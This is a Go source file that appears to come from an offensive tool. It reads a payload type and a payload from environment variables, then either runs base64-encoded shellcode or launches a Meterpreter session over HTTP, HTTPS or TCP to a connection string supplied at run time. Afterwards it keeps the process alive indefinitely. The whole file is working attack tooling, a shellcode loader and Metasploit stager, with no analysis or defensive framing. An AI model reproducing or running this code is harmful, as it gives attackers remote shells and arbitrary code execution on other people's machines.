package main

import (
	"log"
	"os"
	"runtime"
	"time"

	"github.com/kost/gosc/msf"
	"github.com/kost/gosc/shell"
)

func sleepForever() {
	for {
		time.Sleep(time.Second*60)
	}
}

func SCEnvAndExecute() {
	if len(os.Args) != 2 {
		return
	}
	if os.Args[1] != "--childsc" {
		return
	}
	ptype, ok := os.LookupEnv("T2W_CMD")
	if !ok {
		return
	}
	cmdstr, cok := os.LookupEnv("T2W_SC")
	if !cok {
		return
	}
	log.Printf("childsc: %s %s", ptype, cmdstr)
	executed := true
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	switch ptype {
	case "sc":
		shell.ExecShellcode_b64(cmdstr)
	case "msf-http":
		msf.Meterpreter("http", cmdstr)
	case "msf-https":
		msf.Meterpreter("https", cmdstr)
	case "msf-tcp":
		msf.Meterpreter("tcp", cmdstr)
	default:
		log.Printf("childsc no ptype: %s", ptype)
		executed = false
	}

	log.Printf("childsc sleep: %s %s", ptype, cmdstr)
	if executed {
		sleepForever()
	}
	os.Exit(0)
}
